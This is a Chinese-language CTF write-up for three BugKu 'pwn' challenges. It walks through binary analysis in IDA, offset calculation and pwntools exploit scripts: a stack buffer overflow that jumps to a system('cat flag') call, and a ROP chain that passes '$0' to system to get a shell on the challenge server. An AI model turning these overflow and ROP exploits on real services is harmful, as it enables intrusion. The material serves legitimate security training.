---
title: BUGKU[Pwn]
author: Stan
date: 2020-05-18 09:10:33 +0800
categories: [BugKu,BugKu-Pwn]
tags: [Pwn]
---
## pwn1
```
nc 114.116.54.89 10001
```

直接nc过去，ls即可看到文件，发现flag，cat即可发现flag

```
cat flag
```

---

## pwn2

先下载文件，拉入UBUNTU，checksec检查一下

	checksec pwn2

发现啥都没开，最重要的是架构是amd64

在windows里把pwn2拉入64位ida

按`F5`切换到伪C

注意这句话

> read(0, &s, 0x100uLL);

常见的缓冲区漏洞

按`shift+f12`查看字符串

发现有一个cat flag

按`x`发现交叉引用

> .text:0000000000400769                 mov     edi, offset command ; "cat flag"
> .text:000000000040076E                 call    _system

之后计算偏移offset

> char s; // [sp+0h] [bp-30h]

s=30h=48

向上8字节rbp

> +0000000000000000  s              db 8 dup(?)
> +0000000000000008  r              db 8 dup(?)

所以offset=48+8=56

之后写exploit

```python
from pwn import * 
a=remote('114.116.54.89',10003)
a.recvuntil("?") 
a.sendline(b"a" * 56 + p64(0x400769))
a.interactive()
```

然后运行

```
python 1.py
```

即可发现flag

---

## pwn4

先下载文件，拉入UBUNTU，checksec检查一下

	checksec pwn4

发现啥都没开，最重要的是架构是amd64

在windows里把pwn4拉入64位ida

按`F5`切换到伪C

发现read可以溢出

> read(0, &s, 0x30uLL);

`shift+f12`查看字符串，发现没有/bin/sh,但是有$0

> .data:0000000000601100 a4985y9yDyYfg8y db '4985y9y()DY)*YFG8yas08d976s08d7$0',0

$0传入system的效果和/bin/sh一样

查找$0的地址

````
ROPgadget --binary pwn4 --string '\$0'
````

![image-20200922233127332](https://i.loli.net/2020/09/22/PiJSHxp349dfFvK.png)

因为要做ROP，之后找pop rdi ; ret的地址

````
ROPgadget --binary pwn4 --only 'pop|ret'
````

![image-20200922233308201](https://i.loli.net/2020/09/22/awYEFAjROLTXo9q.png)

之后找system函数的地址，直接在IDA里就能找到

> .text:000000000040075A                 call    _system

然后构造exploit

````python
from pwn import * 
a=remote('114.116.54.89',10004)
a.recvuntil("e") 

rdi = 0x00000000004007d3 
bash = 0x000000000060111f
system = 0x000000000040075A
a.sendline(b"a" * (16+8) +p64(rdi)+p64(bash)+p64(system))

a.interactive()
````

运行脚本就连上了，`catflag`即可发现flag